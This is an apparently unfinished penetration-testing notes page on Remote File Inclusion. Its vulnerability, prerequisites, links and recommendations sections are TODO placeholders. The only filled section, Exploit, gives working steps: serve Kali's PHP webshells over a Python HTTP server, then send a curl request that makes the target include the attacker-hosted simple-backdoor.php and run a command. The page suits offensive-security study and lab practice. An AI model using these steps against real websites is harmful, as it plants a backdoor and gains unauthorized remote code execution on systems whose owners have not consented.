---
layout: default
title: Remote File Inclusion
parent: Web Applications
nav_order: 1
permalink: /webapps/rfi/
---

# Remote File Inclusion
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

TODO: Describe the vulnerability here.

## Prerequisites

* TODO: List prerequisites here.

## Exploit

First, identify a target website that loads external content or resources. Then, prepare a payload. For example, if you target PHP web application, `/usr/share/webshells/php/` contains multiple useful webshells. You need to make one of these accessible by your target.

```bash
# Go in your payload's directory
cd /usr/share/webshells/php/

# Make it available on port 80
python3 -m http.server 80

# Ask your target to access your payload exposed on your python http server
curl "http://$target/whatever/index.php?page=http://$lhost/simple-backdoor.php&cmd=ls"
```

## Useful links

* TODO: List links here.

## Recommendations

- [ ] TODO: List recommendations here.